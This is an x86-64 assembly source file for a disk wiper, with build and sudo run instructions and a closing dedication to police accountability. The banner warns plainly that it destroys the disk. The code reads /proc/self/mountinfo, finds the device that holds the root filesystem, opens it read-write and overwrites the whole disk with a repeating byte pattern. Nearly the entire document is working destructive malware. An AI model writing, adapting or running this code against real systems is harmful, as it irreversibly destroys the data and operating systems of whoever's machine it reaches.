;;;;;;;;; ;;;;;;;;; ;;;;;;;;; ;;;;;;;;; ;;;;;;;;; ;;;   ;;; ;;;;;;;;; ;;;;;;;;; 
;;;   ;;; ;;;   ;;; ;;;       ;;;          ;;;    ;;;;  ;;; ;;;          ;;;    
;;;;;;;;; ;;;;;;;;; ;;;;;;    ;;;          ;;;    ;;; ; ;;; ;;;          ;;;    
;;;       ;;;;;;    ;;;       ;;;          ;;;    ;;;  ;;;; ;;;          ;;;    
;;;       ;;;   ;;; ;;;;;;;;; ;;;;;;;;; ;;;;;;;;; ;;;   ;;; ;;;;;;;;;    ;;;    
;-------------------------------------------------------------------------------
;                                /!\ WARNING /!\                                
;      This program WILL destroy your disk. Run at your own risk, and only      
;                   on systems you are authorized to destroy.                   
;                                                                               
; This program opens /proc/self/mountinfo to enumerate filesystems and disks.   
; It finds where the filesystem root (/) is mounted, and writes a pattern to    
; the entirety of the disk.                                                     
;                                                                               
; Using /proc/self/mountinfo to find / :                                        
;                                                                               
; [ EXAMPLE ]                                                                   
;                                                                               
; $ grep '/ / ' /proc/self/mountinfo                                            
; 32 1 259:2 / / rw,relatime shared:1 - ext4 /dev/nvme0n1p2 rw,errors=remount-ro
; $ grep '/ / ' /proc/self/mountinfo                                            
; 25 0 8:0 / / rw,relatime shared:1 - ext4 /dev/sda rw,errors=remount-ro        
;                                                                               
; Build:                                                                        
; $ nasm -f elf64 p3.asm ; ld p3.o -o p3                                        
; Run:                                                                          
; $ sudo ./p3                                                                   
;----------------------------------------------------------------- @netspooky --
                               ;;;;;;;;; ;;;   ;;; ;;;;;;;;; ;;;;;;;;; ;;;;;;;;;
                                  ;;;    ;;;   ;;; ;;;   ;;; ;;;       ;;;      
                                  ;;;    ;;;;;;;;; ;;;;;;;;; ;;;;;;    ;;;;;;   
                                  ;;;    ;;;   ;;; ;;;;;;    ;;;       ;;;      
                                  ;;;    ;;;   ;;; ;;;   ;;; ;;;;;;;;; ;;;;;;;;;
;-------------------------------------------------------------------------------
section .text                                                                  ;
global _start                                                                  ;
_start:                                                                        ;
    mov rdi, 0x6f666e69         ; Pushing the                                  ;
    push rdi                    ; file name                                    ;
    mov rdi, 0x746e756f6d2f666c ; /proc/self/mountinfo                         ;
    push rdi                    ; onto the stack                               ;
    mov rdi, 0x65732f636f72702f ; ...                                          ;
    push rdi                    ; ...                                          ;
    mov rdi, rsp                ; const char *pathname                         ;
    xor rsi, rsi                ; int flags - O_RDONLY                         ;
    mov rax, rsi                ; 0                                            ;
    inc rax                     ; 1                                            ;
    inc rax                     ; 2 - open syscall                             ;
    syscall                     ;                                              ;
reader: ; Reading /proc/self/mountinfo so we can parse it.                     ;
    inc rdx                     ; 1                                            ;
    shl rdx, 14                 ; size_t count - # of bytes to read - 0x400    ;
    sub rsp, rdx                ; Make space on the stack - 0x400              ;
    mov r9, rax                 ; Save fd in r9 for later                      ;
    mov rdi, rax                ; int fd - The file descriptor                 ;
    mov rsi, rsp                ; void *buf - The buffer that is the stack     ;
    xor eax, eax                ; 0 - read syscall                             ;
    syscall                     ; RSI still contains the buffer after syscall  ;
    mov di, 0x202f              ; '/ ' - The byte pattern to look for          ;
    xor rcx, rcx                ; 0                                            ;
    inc rcx                     ; 1                                            ;
    shl rcx, 14                 ; 0x400 - Counter for reading the file chunk   ;
comp1: ; Looking for the first slash and space in each entry                   ;
    mov bx, word[rsp]           ; Move word to bl                              ;
    cmp di, bx                  ; Compare to the '/ ' pattern                  ;
    je comp2                    ; Disk entry found, onto next comparison       ;
    dec rcx                     ; Decrement counter                            ;
    jz xxit                     ; Jump if zero to the end                      ;
    inc rsp                     ; Read the next byte in the file               ;
    jmp comp1                   ; Jump back to the top                         ;
comp2: ; Here we are looking for the next slash and space                      ;
    inc rsp                     ; Since we already know the two bytes at the   ;
    inc rsp                     ; pointer, inc twice to get next two bytes     ;
    mov bx, word[rsp]           ; Move word to bl                              ;
    cmp di, bx                  ; Make the same comparison to '/ '             ;
    je comp3                    ; Disk holding / was found                     ;
    dec rcx                     ; Decrement counter                            ;
    jz xxit                     ; Jump if zero to the end                      ;
    dec rcx                     ; Decrement counter                            ;
    jz xxit                     ; Jump if zero to the end                      ;
    inc rsp                     ; If we didn't find anything, keep going       ;
    jmp comp1                   ; And back to first comparison                 ;
comp3: ; At this point, we have located the '/ / ' record, so we can look for  ;
       ; the next slash in the disk name                                       ;
    inc rsp                     ; Increment through the rest of the line       ;
    mov bl, byte[rsp]           ; Get just one byte now                        ;
    cmp dil, bl                 ; dil contains '/'                             ;
    je prep                     ; If we found it, we have the disk name        ;
    jmp comp3                   ; If not, keep going                           ;
prep: ; Preparing for the final comparison                                     ;
    xor rcx, rcx                ; This will hold the length of the disk name   ;
    mov dil, 0x20               ; We are now looking for a space.              ;
getdisk: ; Here we are grabbing the entire disk name                           ;
    inc rsp                     ; Increment the index                          ;
    inc rcx                     ; Increment our length counter                 ;
    mov bl, byte[rsp]           ; Grab a byte                                  ;
    cmp dil, bl                 ; Compare to a ' ' char                        ;
    je opendisk                 ; If it matches, we found it!                  ;
    jmp getdisk                 ; If not, keep going!                          ;
opendisk: ; Now we are going to open the disk as a file as we did earlier.     ;
    xor rsi, rsi                ; 0                                            ;
    add rsp, 8                  ; Pushing a 0 for the null...                  ;
    push rsi                    ; ...terminator on the disk name string.       ;
    sub rsp, rcx                ; Now RSP points to the disk name              ;
    mov rdi, rsp                ; const char *pathname - pointer to disk name  ;
    inc rsi                     ; 1                                            ;
    inc rsi                     ; 2 - O_RDWR                                   ;
    mov rax, rsi                ; 2 - open syscall                             ;
    syscall                                                                    ;
writer: ; We now have the disk open in RW mode, no append.                     ;
    mov rdi, rax                ; int fd - The file descriptor                 ;
    mov rsi, 0x7557575757575775 ; This is the marker payload - uWWWWWWu        ;
    push rsi                    ; Push the payload                             ;
    mov rsi, rsp                ; const void *buf - Payload pointer            ;
    xor rax, rax                ; 0                                            ;
    inc rax                     ; 1 - write syscall                            ;
    mov rdx, rax                ; Get that 1                                   ;
    shl rdx, 3                  ; 8 size_t count - # of bytes to write         ;
    syscall                                                                    ;
lseeker: ; We have to set up the lseek call so that we will continue writing   ;
         ; to the next byte in the file upon each additional write.            ;
    xor rdx, rdx                ; 0                                            ;
    inc rdx                     ; int whence; 1 = SEEK_SET                     ;
    mov rsi, rdx                ; 1                                            ;
    shl rsi, 3                  ; off_t offset; 8 - # of bytes to seek         ;
    mov rax, rsi                ; 8 - lseek syscall                            ;
    syscall                     ; Note that RDI still contains fd              ;
writer2: ; The final write loop, likely segfaults                              ;
    mov rsi, 0xABACABACABACABAC ; This is the pattern payload                  ;
    push rsi                    ; Push the payload                             ;
    mov rsi, rsp                ; const void *buf - Payload pointer            ;
    xor rax, rax                ; 0                                            ;
    inc rax                     ; 1 - write syscall                            ;
    mov rdx, rax                ; Get that 1                                   ;
    shl rdx, 3                  ; 8 size_t count - # of bytes to write         ;
    syscall                                                                    ;
    jmp writer2                 ; Bring it around town                         ;
xxit: ; This is really only here in case of failure                            ;
    mov al, 0x3c                ; exit syscall                                 ;
    xor rdi, rdi                ; 0 - Return code                              ;
    syscall ;------------------------------------------------------------------;
            ; Dedicated to those fighting for police accountability worldwide. ;
            ;------------------------------------------------------------------;

